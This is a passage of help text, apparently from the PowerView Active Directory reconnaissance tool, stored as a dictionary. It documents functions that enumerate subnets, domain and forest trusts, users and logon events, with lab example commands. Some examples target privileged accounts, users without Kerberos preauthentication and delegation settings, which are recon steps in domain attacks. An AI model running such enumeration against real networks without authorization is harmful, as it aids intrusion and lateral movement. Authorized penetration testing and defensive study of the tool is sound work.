                   '$Cred = New-Object '
                   "System.Management.Automation.PSCredential('TESTLAB\\dfm.a', "
                   '$SecPassword)\n'
                   'Get-DomainSite -Credential $Cred\n'
                   '\n'
                   '.OUTPUTS\n'
                   '\n'
                   'PowerView.Site\n'
                   '\n'
                   'Custom PSObject with translated site property fields.\n',
 'Get-DomainSubnet': '.SYNOPSIS\n'
                     '\n'
                     'Search for all subnets or specific subnets objects in '
                     'AD.\n'
                     '\n'
                     'Author: Will Schroeder (@harmj0y)  \n'
                     'License: BSD 3-Clause  \n'
                     'Required Dependencies: Get-DomainSearcher, '
                     'Convert-LDAPProperty  \n'
                     '\n'
                     '.DESCRIPTION\n'
                     '\n'
                     'Builds a directory searcher object using '
                     'Get-DomainSearcher, builds a custom\n'
                     'LDAP filter based on targeting/filter parameters, and '
                     'searches for all objects\n'
                     'matching the criteria. To only return specific '
                     'properties, use\n'
                     '"-Properties whencreated,usnchanged,...". By default, '
                     'all subnet objects for\n'
                     'the current domain are returned.\n'
                     '\n'
                     '.PARAMETER Identity\n'
                     '\n'
                     "An subnet name (e.g. '192.168.50.0/24'), "
                     'DistinguishedName (e.g. '
                     "'CN=192.168.50.0/24,CN=Subnets,CN=Sites,CN=Configuratioiguration,DC=testlab,DC=local'),\n"
                     'or GUID (e.g. c37726ef-2b64-4524-b85b-6a9700c234dd). '
                     'Wildcards accepted.\n'
                     '\n'
                     '.PARAMETER SiteName\n'
                     '\n'
                     'Only return subnets from the specified SiteName.\n'
                     '\n'
                     '.PARAMETER Domain\n'
                     '\n'
                     'Specifies the domain to use for the query, defaults to '
                     'the current domain.\n'
                     '\n'
                     '.PARAMETER LDAPFilter\n'
                     '\n'
                     'Specifies an LDAP query string that is used to filter '
                     'Active Directory objects.\n'
                     '\n'
                     '.PARAMETER Properties\n'
                     '\n'
                     'Specifies the properties of the output object to '
                     'retrieve from the server.\n'
                     '\n'
                     '.PARAMETER SearchBase\n'
                     '\n'
                     'The LDAP source to search through, e.g. '
                     '"LDAP://OU=secret,DC=testlab,DC=local"\n'
                     'Useful for OU queries.\n'
                     '\n'
                     '.PARAMETER Server\n'
                     '\n'
                     'Specifies an Active Directory server (domain controller) '
                     'to bind to.\n'
                     '\n'
                     '.PARAMETER SearchScope\n'
                     '\n'
                     'Specifies the scope to search under, '
                     'Base/OneLevel/Subtree (default of Subtree).\n'
                     '\n'
                     '.PARAMETER ResultPageSize\n'
                     '\n'
                     'Specifies the PageSize to set for the LDAP searcher '
                     'object.\n'
                     '\n'
                     '.PARAMETER ServerTimeLimit\n'
                     '\n'
                     'Specifies the maximum amount of time the server spends '
                     'searching. Default of 120 seconds.\n'
                     '\n'
                     '.PARAMETER SecurityMasks\n'
                     '\n'
                     'Specifies an option for examining security information '
                     'of a directory object.\n'
                     "One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.\n"
                     '\n'
                     '.PARAMETER Tombstone\n'
                     '\n'
                     'Switch. Specifies that the searcher should also return '
                     'deleted/tombstoned objects.\n'
                     '\n'
                     '.PARAMETER FindOne\n'
                     '\n'
                     'Only return one result object.\n'
                     '\n'
                     '.PARAMETER Credential\n'
                     '\n'
                     'A [Management.Automation.PSCredential] object of '
                     'alternate credentials\n'
                     'for connection to the target domain.\n'
                     '\n'
                     '.PARAMETER Raw\n'
                     '\n'
                     'Switch. Return raw results instead of translating the '
                     'fields into a custom PSObject.\n'
                     '\n'
                     '.EXAMPLE\n'
                     '\n'
                     'Get-DomainSubnet\n'
                     '\n'
                     'Returns the current subnets in the domain.\n'
                     '\n'
                     '.EXAMPLE\n'
                     '\n'
                     'Get-DomainSubnet *admin* -Domain testlab.local\n'
                     '\n'
                     'Returns all subnets with "admin" in their name in the '
                     'testlab.local domain.\n'
                     '\n'
                     '.EXAMPLE\n'
                     '\n'
                     'Get-DomainSubnet -GPLink '
                     '"F260B76D-55C8-46C5-BEF1-9016DD98E272"\n'
                     '\n'
                     'Returns all subnets with linked to the specified group '
                     'policy object.\n'
                     '\n'
                     '.EXAMPLE\n'
                     '\n'
                     "$SecPassword = ConvertTo-SecureString 'Password123!' "
                     '-AsPlainText -Force\n'
                     '$Cred = New-Object '
                     "System.Management.Automation.PSCredential('TESTLAB\\dfm.a', "
                     '$SecPassword)\n'
                     'Get-DomainSubnet -Credential $Cred\n'
                     '\n'
                     '.OUTPUTS\n'
                     '\n'
                     'PowerView.Subnet\n'
                     '\n'
                     'Custom PSObject with translated subnet property '
                     'fields.\n',
 'Get-DomainTrust': '.SYNOPSIS\n'
                    '\n'
                    'Return all domain trusts for the current domain or a '
                    'specified domain.\n'
                    '\n'
                    'Author: Will Schroeder (@harmj0y)  \n'
                    'License: BSD 3-Clause  \n'
                    'Required Dependencies: Get-Domain, Get-DomainSearcher, '
                    'Get-DomainSID, PSReflect  \n'
                    '\n'
                    '.DESCRIPTION\n'
                    '\n'
                    'This function will enumerate domain trust relationships '
                    'for the current (or a remote)\n'
                    'domain using a number of methods. By default, and LDAP '
                    'search using the filter\n'
                    "'(objectClass=trustedDomain)' is used- if any "
                    'LDAP-appropriate parameters are specified\n'
                    'LDAP is used as well. If the -NET flag is specified, the '
                    '.NET method\n'
                    'GetAllTrustRelationships() is used on the '
                    'System.DirectoryServices.ActiveDirectory.Domain\n'
                    'object. If the -API flag is specified, the Win32 API '
                    'DsEnumerateDomainTrusts() call is\n'
                    'used to enumerate instead.\n'
                    '\n'
                    '.PARAMETER Domain\n'
                    '\n'
                    'Specifies the domain to query for trusts, defaults to the '
                    'current domain.\n'
                    '\n'
                    '.PARAMETER API\n'
                    '\n'
                    'Switch. Use an API call (DsEnumerateDomainTrusts) to '
                    'enumerate the trusts instead of the built-in\n'
                    '.NET methods.\n'
                    '\n'
                    '.PARAMETER NET\n'
                    '\n'
                    'Switch. Use .NET queries to enumerate trusts instead of '
                    'the default LDAP method.\n'
                    '\n'
                    '.PARAMETER LDAPFilter\n'
                    '\n'
                    'Specifies an LDAP query string that is used to filter '
                    'Active Directory objects.\n'
                    '\n'
                    '.PARAMETER Properties\n'
                    '\n'
                    'Specifies the properties of the output object to retrieve '
                    'from the server.\n'
                    '\n'
                    '.PARAMETER SearchBase\n'
                    '\n'
                    'The LDAP source to search through, e.g. '
                    '"LDAP://OU=secret,DC=testlab,DC=local"\n'
                    'Useful for OU queries.\n'
                    '\n'
                    '.PARAMETER Server\n'
                    '\n'
                    'Specifies an Active Directory server (domain controller) '
                    'to bind to.\n'
                    '\n'
                    '.PARAMETER SearchScope\n'
                    '\n'
                    'Specifies the scope to search under, '
                    'Base/OneLevel/Subtree (default of Subtree).\n'
                    '\n'
                    '.PARAMETER ResultPageSize\n'
                    '\n'
                    'Specifies the PageSize to set for the LDAP searcher '
                    'object.\n'
                    '\n'
                    '.PARAMETER ServerTimeLimit\n'
                    '\n'
                    'Specifies the maximum amount of time the server spends '
                    'searching. Default of 120 seconds.\n'
                    '\n'
                    '.PARAMETER Tombstone\n'
                    '\n'
                    'Switch. Specifies that the searcher should also return '
                    'deleted/tombstoned objects.\n'
                    '\n'
                    '.PARAMETER FindOne\n'
                    '\n'
                    'Only return one result object.\n'
                    '\n'
                    '.PARAMETER Credential\n'
                    '\n'
                    'A [Management.Automation.PSCredential] object of '
                    'alternate credentials\n'
                    'for connection to the target domain.\n'
                    '\n'
                    '.EXAMPLE\n'
                    '\n'
                    'Get-DomainTrust\n'
                    '\n'
                    'Return domain trusts for the current domain using built '
                    'in .LDAP methods.\n'
                    '\n'
                    '.EXAMPLE\n'
                    '\n'
                    'Get-DomainTrust -NET -Domain "prod.testlab.local"\n'
                    '\n'
                    'Return domain trusts for the "prod.testlab.local" domain '
                    'using .NET methods\n'
                    '\n'
                    '.EXAMPLE\n'
                    '\n'
                    "$SecPassword = ConvertTo-SecureString 'Password123!' "
                    '-AsPlainText -Force\n'
                    '$Cred = New-Object '
                    "System.Management.Automation.PSCredential('TESTLAB\\dfm.a', "
                    '$SecPassword)\n'
                    'Get-DomainTrust -Domain "prod.testlab.local" -Server '
                    '"PRIMARY.testlab.local" -Credential $Cred\n'
                    '\n'
                    'Return domain trusts for the "prod.testlab.local" domain '
                    'enumerated through LDAP\n'
                    'queries, binding to the PRIMARY.testlab.local server for '
                    'queries, and using the specified\n'
                    'alternate credenitals.\n'
                    '\n'
                    '.EXAMPLE\n'
                    '\n'
                    'Get-DomainTrust -API -Domain "prod.testlab.local"\n'
                    '\n'
                    'Return domain trusts for the "prod.testlab.local" domain '
                    'enumerated through API calls.\n'
                    '\n'
                    '.OUTPUTS\n'
                    '\n'
                    'PowerView.DomainTrust.LDAP\n'
                    '\n'
                    'Custom PSObject with translated domain LDAP trust result '
                    'fields (default).\n'
                    '\n'
                    'PowerView.DomainTrust.NET\n'
                    '\n'
                    'A TrustRelationshipInformationCollection returned when '
                    'using .NET methods.\n'
                    '\n'
                    'PowerView.DomainTrust.API\n'
                    '\n'
                    'Custom PSObject with translated domain API trust result '
                    'fields.\n',
 'Get-DomainTrustMapping': '.SYNOPSIS\n'
                           '\n'
                           'This function enumerates all trusts for the '
                           'current domain and then enumerates\n'
                           'all trusts for each domain it finds.\n'
                           '\n'
                           'Author: Will Schroeder (@harmj0y)  \n'
                           'License: BSD 3-Clause  \n'
                           'Required Dependencies: Get-Domain, '
                           'Get-DomainTrust, Get-ForestTrust  \n'
                           '\n'
                           '.DESCRIPTION\n'
                           '\n'
                           'This function will enumerate domain trust '
                           'relationships for the current domain using\n'
                           'a number of methods, and then enumerates all '
                           'trusts for each found domain, recursively\n'
                           'mapping all reachable trust relationships. By '
                           'default, and LDAP search using the filter\n'
                           "'(objectClass=trustedDomain)' is used- if any "
                           'LDAP-appropriate parameters are specified\n'
                           'LDAP is used as well. If the -NET flag is '
                           'specified, the .NET method\n'
                           'GetAllTrustRelationships() is used on the '
                           'System.DirectoryServices.ActiveDirectory.Domain\n'
                           'object. If the -API flag is specified, the Win32 '
                           'API DsEnumerateDomainTrusts() call is\n'
                           'used to enumerate instead. If any \n'
                           '\n'
                           '.PARAMETER API\n'
                           '\n'
                           'Switch. Use an API call (DsEnumerateDomainTrusts) '
                           'to enumerate the trusts instead of the\n'
                           'built-in LDAP method.\n'
                           '\n'
                           '.PARAMETER NET\n'
                           '\n'
                           'Switch. Use .NET queries to enumerate trusts '
                           'instead of the default LDAP method.\n'
                           '\n'
                           '.PARAMETER LDAPFilter\n'
                           '\n'
                           'Specifies an LDAP query string that is used to '
                           'filter Active Directory objects.\n'
                           '\n'
                           '.PARAMETER Properties\n'
                           '\n'
                           'Specifies the properties of the output object to '
                           'retrieve from the server.\n'
                           '\n'
                           '.PARAMETER SearchBase\n'
                           '\n'
                           'The LDAP source to search through, e.g. '
                           '"LDAP://OU=secret,DC=testlab,DC=local"\n'
                           'Useful for OU queries.\n'
                           '\n'
                           '.PARAMETER Server\n'
                           '\n'
                           'Specifies an Active Directory server (domain '
                           'controller) to bind to.\n'
                           '\n'
                           '.PARAMETER SearchScope\n'
                           '\n'
                           'Specifies the scope to search under, '
                           'Base/OneLevel/Subtree (default of Subtree).\n'
                           '\n'
                           '.PARAMETER ResultPageSize\n'
                           '\n'
                           'Specifies the PageSize to set for the LDAP '
                           'searcher object.\n'
                           '\n'
                           '.PARAMETER ServerTimeLimit\n'
                           '\n'
                           'Specifies the maximum amount of time the server '
                           'spends searching. Default of 120 seconds.\n'
                           '\n'
                           '.PARAMETER Tombstone\n'
                           '\n'
                           'Switch. Specifies that the searcher should also '
                           'return deleted/tombstoned objects.\n'
                           '\n'
                           '.PARAMETER Credential\n'
                           '\n'
                           'A [Management.Automation.PSCredential] object of '
                           'alternate credentials\n'
                           'for connection to the target domain.\n'
                           '\n'
                           '.EXAMPLE\n'
                           '\n'
                           'Get-DomainTrustMapping | Export-CSV '
                           '-NoTypeInformation trusts.csv\n'
                           '\n'
                           'Map all reachable domain trusts using .NET methods '
                           'and output everything to a .csv file.\n'
                           '\n'
                           '.EXAMPLE\n'
                           '\n'
                           'Get-DomainTrustMapping -API | Export-CSV '
                           '-NoTypeInformation trusts.csv\n'
                           '\n'
                           'Map all reachable domain trusts using Win32 API '
                           'calls and output everything to a .csv file.\n'
                           '\n'
                           '.EXAMPLE\n'
                           '\n'
                           'Get-DomainTrustMapping -NET | Export-CSV '
                           '-NoTypeInformation trusts.csv\n'
                           '\n'
                           'Map all reachable domain trusts using .NET methods '
                           'and output everything to a .csv file.\n'
                           '\n'
                           '.EXAMPLE\n'
                           '\n'
                           '$SecPassword = ConvertTo-SecureString '
                           "'Password123!' -AsPlainText -Force\n"
                           '$Cred = New-Object '
                           "System.Management.Automation.PSCredential('TESTLAB\\dfm.a', "
                           '$SecPassword)\n'
                           'Get-DomainTrustMapping -Server '
                           "'PRIMARY.testlab.local' | Export-CSV "
                           '-NoTypeInformation trusts.csv\n'
                           '\n'
                           'Map all reachable domain trusts using LDAP, '
                           'binding to the PRIMARY.testlab.local server for '
                           'queries\n'
                           'using the specified alternate credentials, and '
                           'output everything to a .csv file.\n'
                           '\n'
                           '.OUTPUTS\n'
                           '\n'
                           'PowerView.DomainTrust.LDAP\n'
                           '\n'
                           'Custom PSObject with translated domain LDAP trust '
                           'result fields (default).\n'
                           '\n'
                           'PowerView.DomainTrust.NET\n'
                           '\n'
                           'A TrustRelationshipInformationCollection returned '
                           'when using .NET methods.\n'
                           '\n'
                           'PowerView.DomainTrust.API\n'
                           '\n'
                           'Custom PSObject with translated domain API trust '
                           'result fields.\n',
 'Get-DomainUser': '.SYNOPSIS\n'
                   '\n'
                   'Return all users or specific user objects in AD.\n'
                   '\n'
                   'Author: Will Schroeder (@harmj0y)  \n'
                   'License: BSD 3-Clause  \n'
                   'Required Dependencies: Get-DomainSearcher, Convert-ADName, '
                   'Convert-LDAPProperty  \n'
                   '\n'
                   '.DESCRIPTION\n'
                   '\n'
                   'Builds a directory searcher object using '
                   'Get-DomainSearcher, builds a custom\n'
                   'LDAP filter based on targeting/filter parameters, and '
                   'searches for all objects\n'
                   'matching the criteria. To only return specific properties, '
                   'use\n'
                   '"-Properties samaccountname,usnchanged,...". By default, '
                   'all user objects for\n'
                   'the current domain are returned.\n'
                   '\n'
                   '.PARAMETER Identity\n'
                   '\n'
                   'A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. '
                   'CN=harmj0y,CN=Users,DC=testlab,DC=local),\n'
                   'SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), '
                   'or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).\n'
                   'Wildcards accepted. Also accepts DOMAIN\\user format.\n'
                   '\n'
                   '.PARAMETER SPN\n'
                   '\n'
                   'Switch. Only return user objects with non-null service '
                   'principal names.\n'
                   '\n'
                   '.PARAMETER UACFilter\n'
                   '\n'
                   'Dynamic parameter that accepts one or more values from '
                   '$UACEnum, including\n'
                   '"NOT_X" negation forms. To see all possible values, run '
                   "'0|ConvertFrom-UACValue -ShowAll'.\n"
                   '\n'
                   '.PARAMETER AdminCount\n'
                   '\n'
                   "Switch. Return users with '(adminCount=1)' (meaning "
                   'are/were privileged).\n'
                   '\n'
                   '.PARAMETER AllowDelegation\n'
                   '\n'
                   'Switch. Return user accounts that are not marked as '
                   "'sensitive and not allowed for delegation'\n"
                   '\n'
                   '.PARAMETER DisallowDelegation\n'
                   '\n'
                   "Switch. Return user accounts that are marked as 'sensitive "
                   "and not allowed for delegation'\n"
                   '\n'
                   '.PARAMETER TrustedToAuth\n'
                   '\n'
                   'Switch. Return computer objects that are trusted to '
                   'authenticate for other principals.\n'
                   '\n'
                   '.PARAMETER PreauthNotRequired\n'
                   '\n'
                   'Switch. Return user accounts with "Do not require Kerberos '
                   'preauthentication" set.\n'
                   '\n'
                   '.PARAMETER Domain\n'
                   '\n'
                   'Specifies the domain to use for the query, defaults to the '
                   'current domain.\n'
                   '\n'
                   '.PARAMETER LDAPFilter\n'
                   '\n'
                   'Specifies an LDAP query string that is used to filter '
                   'Active Directory objects.\n'
                   '\n'
                   '.PARAMETER Properties\n'
                   '\n'
                   'Specifies the properties of the output object to retrieve '
                   'from the server.\n'
                   '\n'
                   '.PARAMETER SearchBase\n'
                   '\n'
                   'The LDAP source to search through, e.g. '
                   '"LDAP://OU=secret,DC=testlab,DC=local"\n'
                   'Useful for OU queries.\n'
                   '\n'
                   '.PARAMETER Server\n'
                   '\n'
                   'Specifies an Active Directory server (domain controller) '
                   'to bind to.\n'
                   '\n'
                   '.PARAMETER SearchScope\n'
                   '\n'
                   'Specifies the scope to search under, Base/OneLevel/Subtree '
                   '(default of Subtree).\n'
                   '\n'
                   '.PARAMETER ResultPageSize\n'
                   '\n'
                   'Specifies the PageSize to set for the LDAP searcher '
                   'object.\n'
                   '\n'
                   '.PARAMETER ServerTimeLimit\n'
                   '\n'
                   'Specifies the maximum amount of time the server spends '
                   'searching. Default of 120 seconds.\n'
                   '\n'
                   '.PARAMETER SecurityMasks\n'
                   '\n'
                   'Specifies an option for examining security information of '
                   'a directory object.\n'
                   "One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.\n"
                   '\n'
                   '.PARAMETER Tombstone\n'
                   '\n'
                   'Switch. Specifies that the searcher should also return '
                   'deleted/tombstoned objects.\n'
                   '\n'
                   '.PARAMETER FindOne\n'
                   '\n'
                   'Only return one result object.\n'
                   '\n'
                   '.PARAMETER Credential\n'
                   '\n'
                   'A [Management.Automation.PSCredential] object of alternate '
                   'credentials\n'
                   'for connection to the target domain.\n'
                   '\n'
                   '.PARAMETER Raw\n'
                   '\n'
                   'Switch. Return raw results instead of translating the '
                   'fields into a custom PSObject.\n'
                   '\n'
                   '.EXAMPLE\n'
                   '\n'
                   'Get-DomainUser -Domain testlab.local\n'
                   '\n'
                   'Return all users for the testlab.local domain\n'
                   '\n'
                   '.EXAMPLE\n'
                   '\n'
                   'Get-DomainUser '
                   '"S-1-5-21-890171859-3433809279-3366196753-1108","administrator"\n'
                   '\n'
                   'Return the user with the given SID, as well as '
                   'Administrator.\n'
                   '\n'
                   '.EXAMPLE\n'
                   '\n'
                   "'S-1-5-21-890171859-3433809279-3366196753-1114', "
                   "'CN=dfm,CN=Users,DC=testlab,DC=local','4c435dd7-dc58-4b14-9a5e-1fdb0e80d201','administrator' "
                   '| Get-DomainUser -Properties samaccountname,lastlogoff\n'
                   '\n'
                   'lastlogoff                                   '
                   'samaccountname\n'
                   '----------                                   '
                   '--------------\n'
                   '12/31/1600 4:00:00 PM                        dfm.a\n'
                   '12/31/1600 4:00:00 PM                        dfm\n'
                   '12/31/1600 4:00:00 PM                        harmj0y\n'
                   '12/31/1600 4:00:00 PM                        '
                   'Administrator\n'
                   '\n'
                   '.EXAMPLE\n'
                   '\n'
                   'Get-DomainUser -SearchBase '
                   '"LDAP://OU=secret,DC=testlab,DC=local" -AdminCount '
                   '-AllowDelegation\n'
                   '\n'
                   'Search the specified OU for privileged user (AdminCount = '
                   '1) that allow delegation\n'
                   '\n'
                   '.EXAMPLE\n'
                   '\n'
                   "Get-DomainUser -LDAPFilter '(!primarygroupid=513)' "
                   '-Properties samaccountname,lastlogon\n'
                   '\n'
                   'Search for users with a primary group ID other than 513 '
                   "('domain users') and only return samaccountname and "
                   'lastlogon\n'
                   '\n'
                   '.EXAMPLE\n'
                   '\n'
                   'Get-DomainUser -UACFilter '
                   'DONT_REQ_PREAUTH,NOT_PASSWORD_EXPIRED\n'
                   '\n'
                   "Find users who doesn't require Kerberos preauthentication "
                   "and DON'T have an expired password.\n"
                   '\n'
                   '.EXAMPLE\n'
                   '\n'
                   "$SecPassword = ConvertTo-SecureString 'Password123!' "
                   '-AsPlainText -Force\n'
                   '$Cred = New-Object '
                   "System.Management.Automation.PSCredential('TESTLAB\\dfm.a', "
                   '$SecPassword)\n'
                   'Get-DomainUser -Credential $Cred\n'
                   '\n'
                   '.EXAMPLE\n'
                   '\n'
                   'Get-Domain | Select-Object -Expand name\n'
                   'testlab.local\n'
                   '\n'
                   'Get-DomainUser dev\\user1 -Verbose -Properties '
                   'distinguishedname\n'
                   'VERBOSE: [Get-DomainSearcher] search string: '
                   'LDAP://PRIMARY.testlab.local/DC=testlab,DC=local\n'
                   'VERBOSE: [Get-DomainSearcher] search string: '
                   'LDAP://PRIMARY.testlab.local/DC=dev,DC=testlab,DC=local\n'
                   'VERBOSE: [Get-DomainUser] filter string: '
                   '(&(samAccountType=805306368)(|(samAccountName=user1)))\n'
                   '\n'
                   'distinguishedname\n'
                   '-----------------\n'
                   'CN=user1,CN=Users,DC=dev,DC=testlab,DC=local\n'
                   '\n'
                   '.INPUTS\n'
                   '\n'
                   'String\n'
                   '\n'
                   '.OUTPUTS\n'
                   '\n'
                   'PowerView.User\n'
                   '\n'
                   'Custom PSObject with translated user property fields.\n'
                   '\n'
                   'PowerView.User.Raw\n'
                   '\n'
                   'The raw DirectoryServices.SearchResult object, if -Raw is '
                   'enabled.\n',
 'Get-DomainUserEvent': '.SYNOPSIS\n'
                        '\n'
                        'Enumerate account logon events (ID 4624) and Logon '
                        'with explicit credential\n'
                        'events (ID 4648) from the specified host (default of '
                        'the localhost).\n'
                        '\n'
                        'Author: Lee Christensen (@tifkin_), Justin Warner '
                        '(@sixdub), Will Schroeder (@harmj0y)  \n'
                        'License: BSD 3-Clause  \n'
                        'Required Dependencies: None  \n'
                        '\n'
                        '.DESCRIPTION\n'
                        '\n'
                        'This function uses an XML path filter passed to '
                        'Get-WinEvent to retrieve\n'
                        'security events with IDs of 4624 (logon events) or '
                        '4648 (explicit credential\n'
                        'logon events) from -StartTime (default of now-1 day) '
                        'to -EndTime (default of now).\n'
                        'A maximum of -MaxEvents (default of 5000) are '
                        'returned.\n'
                        '\n'
                        '.PARAMETER ComputerName\n'
                        '\n'
                        'Specifies the computer name to retrieve events from, '
                        'default of localhost.\n'
                        '\n'
                        '.PARAMETER StartTime\n'
                        '\n'
                        'The [DateTime] object representing the start of when '
                        'to collect events.\n'
                        'Default of [DateTime]::Now.AddDays(-1).\n'
                        '\n'
                        '.PARAMETER EndTime\n'
                        '\n'
                        'The [DateTime] object representing the end of when to '
                        'collect events.\n'
                        'Default of [DateTime]::Now.\n'
                        '\n'
                        '.PARAMETER MaxEvents\n'
                        '\n'
                        'The maximum number of events to retrieve. Default of '
                        '5000.\n'
                        '\n'
                        '.PARAMETER Credential\n'
                        '\n'
                        'A [Management.Automation.PSCredential] object of '
                        'alternate credentials\n'
                        'for connection to the target computer.\n'
                        '\n'
                        '.EXAMPLE\n'
                        '\n'
                        'Get-DomainUserEvent\n'
                        '\n'
                        'Return logon events on the local machine.\n'
                        '\n'
                        '.EXAMPLE\n'
                        '\n'
                        'Get-DomainController | Get-DomainUserEvent -StartTime '
                        '([DateTime]::Now.AddDays(-3))\n'
                        '\n'
                        'Return all logon events from the last 3 days from '
                        'every domain controller in the current domain.\n'
                        '\n'
                        '.EXAMPLE\n'
                        '\n'
                        "$SecPassword = ConvertTo-SecureString 'Password123!' "
                        '-AsPlainText -Force\n'
                        '$Cred = New-Object '
                        "System.Management.Automation.PSCredential('TESTLAB\\dfm.a', "
                        '$SecPassword)\n'
                        'Get-DomainUserEvent -ComputerName '
                        'PRIMARY.testlab.local -Credential $Cred -MaxEvents '
                        '1000\n'
                        '\n'
                        'Return a max of 1000 logon events from the specified '
                        'machine using the specified alternate credentials.\n'
                        '\n'
                        '.OUTPUTS\n'
                        '\n'
                        'PowerView.LogonEvent\n'
                        '\n'
                        'PowerView.ExplicitCredentialLogonEvent\n'
                        '\n'
                        '.LINK\n'
                        '\n'
                        'http://www.sixdub.net/2014/11/07/offensive-event-parsing-bringing-home-trophies/\n',
 'Get-Forest': '.SYNOPSIS\n'
               '\n'
               'Returns the forest object for the current (or specified) '
               'forest.\n'
               '\n'
               'Author: Will Schroeder (@harmj0y)  \n'
               'License: BSD 3-Clause  \n'
               'Required Dependencies: ConvertTo-SID  \n'
               '\n'
               '.DESCRIPTION\n'
               '\n'
               'Returns a System.DirectoryServices.ActiveDirectory.Forest '
               'object for the current\n'
               'forest or the forest specified with -Forest X.\n'
               '\n'
               '.PARAMETER Forest\n'
               '\n'
               'The forest name to query for, defaults to the current forest.\n'
               '\n'
               '.PARAMETER Credential\n'
               '\n'
               'A [Management.Automation.PSCredential] object of alternate '
               'credentials\n'
               'for connection to the target forest.\n'
               '\n'
               '.EXAMPLE\n'
               '\n'
               'Get-Forest -Forest external.domain\n'
               '\n'
               '.EXAMPLE\n'
               '\n'
               "$SecPassword = ConvertTo-SecureString 'Password123!' "
               '-AsPlainText -Force\n'
               '$Cred = New-Object '
               "System.Management.Automation.PSCredential('TESTLAB\\dfm.a', "
               '$SecPassword)\n'
               'Get-Forest -Credential $Cred\n'
               '\n'
               '.OUTPUTS\n'
               '\n'
               'System.Management.Automation.PSCustomObject\n'
               '\n'
               'Outputs a PSObject containing '
               'System.DirectoryServices.ActiveDirectory.Forest in addition\n'
               'to the forest root domain SID.\n',
 'Get-ForestDomain': '.SYNOPSIS\n'
                     '\n'
                     'Return all domains for the current (or specified) '
                     'forest.\n'
                     '\n'
                     'Author: Will Schroeder (@harmj0y)  \n'
                     'License: BSD 3-Clause  \n'
                     'Required Dependencies: Get-Forest  \n'
                     '\n'
                     '.DESCRIPTION\n'
                     '\n'
                     'Returns all domains for the current forest or the forest '
                     'specified\n'
                     'by -Forest X.\n'
                     '\n'
                     '.PARAMETER Forest\n'
                     '\n'
                     'Specifies the forest name to query for domains.\n'
                     '\n'
                     '.PARAMETER Credential\n'
                     '\n'
                     'A [Management.Automation.PSCredential] object of '
                     'alternate credentials\n'
                     'for connection to the target forest.\n'
                     '\n'
                     '.EXAMPLE\n'
                     '\n'
                     'Get-ForestDomain\n'
                     '\n'
                     '.EXAMPLE\n'
                     '\n'
                     'Get-ForestDomain -Forest external.local\n'
                     '\n'
                     '.EXAMPLE\n'
                     '\n'
                     "$SecPassword = ConvertTo-SecureString 'Password123!' "
                     '-AsPlainText -Force\n'
                     '$Cred = New-Object '
                     "System.Management.Automation.PSCredential('TESTLAB\\dfm.a', "
                     '$SecPassword)\n'
                     'Get-ForestDomain -Credential $Cred\n'
                     '\n'
                     '.OUTPUTS\n'
                     '\n'
                     'System.DirectoryServices.ActiveDirectory.Domain\n',
 'Get-ForestGlobalCatalog': '.SYNOPSIS\n'
                            '\n'
                            'Return all global catalogs for the current (or '
                            'specified) forest.\n'
                            '\n'
                            'Author: Will Schroeder (@harmj0y)  \n'
                            'License: BSD 3-Clause  \n'
                            'Required Dependencies: Get-Forest  \n'
                            '\n'
                            '.DESCRIPTION\n'
                            '\n'
                            'Returns all global catalogs for the current '
                            'forest or the forest specified\n'
                            'by -Forest X by using Get-Forest to retrieve the '
                            'specified forest object\n'
                            'and the .FindAllGlobalCatalogs() to enumerate the '
                            'global catalogs.\n'
                            '\n'
                            '.PARAMETER Forest\n'
                            '\n'
                            'Specifies the forest name to query for global '
                            'catalogs.\n'
                            '\n'
                            '.PARAMETER Credential\n'
                            '\n'
                            'A [Management.Automation.PSCredential] object of '
                            'alternate credentials\n'
                            'for connection to the target domain.\n'
                            '\n'
                            '.EXAMPLE\n'
                            '\n'
                            'Get-ForestGlobalCatalog\n'
                            '\n'
                            '.EXAMPLE\n'
                            '\n'
                            '$SecPassword = ConvertTo-SecureString '
                            "'Password123!' -AsPlainText -Force\n"
                            '$Cred = New-Object '
                            "System.Management.Automation.PSCredential('TESTLAB\\dfm.a', "
                            '$SecPassword)\n'
                            'Get-ForestGlobalCatalog -Credential $Cred\n'
                            '\n'
                            '.OUTPUTS\n'
                            '\n'
                            'System.DirectoryServices.ActiveDirectory.GlobalCatalog\n',
 'Get-ForestSchemaClass': '.SYNOPSIS\n'
                          '\n'
                          'Helper that returns the Active Directory schema '
                          'classes for the current\n'
                          '(or specified) forest or returns just the schema '
                          'class specified by\n'
                          '-ClassName X.\n'
                          '\n'
                          'Author: Will Schroeder (@harmj0y)  \n'
                          'License: BSD 3-Clause  \n'
                          'Required Dependencies: Get-Forest  \n'
                          '\n'
                          '.DESCRIPTION\n'
                          '\n'
                          'Uses Get-Forest to retrieve the current (or '
                          'specified) forest. By default,\n'
                          'the .FindAllClasses() method is executed, returning '
                          'a collection of\n'
                          '[DirectoryServices.ActiveDirectory.ActiveDirectorySchemaClass] '
                          'results.\n'
                          'If "-FindClass X" is specified, the '
                          '[DirectoryServices.ActiveDirectory.ActiveDirectorySchemaClass]\n'
                          'result for the specified class name is returned.\n'
                          '\n'
                          '.PARAMETER ClassName\n'
                          '\n'
                          'Specifies a ActiveDirectorySchemaClass name in the '
                          'found schema to return.\n'
                          '\n'
                          '.PARAMETER Forest\n'
                          '\n'
                          'The forest to query for the schema, defaults to the '
                          'current forest.\n'
                          '\n'
                          '.PARAMETER Credential\n'
                          '\n'
                          'A [Management.Automation.PSCredential] object of '
                          'alternate credentials\n'
                          'for connection to the target domain.\n'
                          '\n'
                          '.EXAMPLE\n'
                          '\n'
                          'Get-ForestSchemaClass\n'
                          '\n'
                          'Returns all domain schema classes for the current '
                          'forest.\n'
                          '\n'
                          '.EXAMPLE\n'
                          '\n'
                          'Get-ForestSchemaClass -Forest dev.testlab.local\n'
                          '\n'
                          'Returns all domain schema classes for the '
                          'external.local forest.\n'
                          '\n'
                          '.EXAMPLE\n'
                          '\n'
                          'Get-ForestSchemaClass -ClassName user -Forest '
                          'external.local\n'
                          '\n'
                          'Returns the user schema class for the '
                          'external.local domain.\n'
                          '\n'
                          '.EXAMPLE\n'
                          '\n'
                          '$SecPassword = ConvertTo-SecureString '
                          "'Password123!' -AsPlainText -Force\n"
                          '$Cred = New-Object '
                          "System.Management.Automation.PSCredential('TESTLAB\\dfm.a', "
                          '$SecPassword)\n'
